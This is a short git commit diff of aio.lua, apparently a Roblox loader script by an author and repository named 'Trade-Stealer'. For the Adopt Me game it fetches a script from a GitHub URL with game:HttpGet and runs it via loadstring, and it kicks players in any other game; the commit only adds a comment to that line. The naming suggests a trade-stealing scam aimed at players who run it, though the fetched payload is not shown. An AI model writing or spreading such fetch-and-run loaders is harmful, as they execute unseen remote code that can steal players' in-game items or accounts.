c4af3636e8c7190cb1c79c51b5b08ab2893c74f9
Trade-Stealer <jonsnow12310@gmail.com>
2025-09-13 19:46:49 +0800

    Update aio.lua

--- aio.lua
+++ aio.lua
@@ -6,7 +6,7 @@ local player = game:GetService("Players").LocalPlayer
 
 if gameId == 920587237 then
     -- Adopt Me
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Roblox"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Roblox"))() --fetching server-main
 else
     -- Unsupported game
     player:Kick("Adopt Me! Only supported")
